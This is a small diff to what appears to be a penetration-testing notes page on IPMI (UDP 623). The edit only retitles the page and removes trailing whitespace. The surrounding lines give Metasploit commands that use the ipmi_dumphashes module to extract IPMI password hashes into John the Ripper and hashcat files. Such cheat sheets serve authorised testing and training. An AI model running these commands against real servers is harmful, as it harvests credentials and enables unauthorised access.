@@ -1,4 +1,4 @@
-# IPMI - 623
+# IPMI - U623
 
 #### Dump Hashes
 
@@ -7,11 +7,11 @@
 use auxiliary/scanner/ipmi/ipmi_dumphashes
 set rhosts <>
 services -p 623 -R
-set OUTPUT_JOHN_FILE ipmi_john.txt 
-set OUTPUT_HASHCAT_FILE ipmi_hashcat.txt 
+set OUTPUT_JOHN_FILE ipmi_john.txt
+set OUTPUT_HASHCAT_FILE ipmi_hashcat.txt
 set USER_FILE user_file.txt
-set THREADS 25  
-set SESSION_MAX_ATTEMPTS 10 
+set THREADS 25
+set SESSION_MAX_ATTEMPTS 10
 ```
 {% endcode %}
 
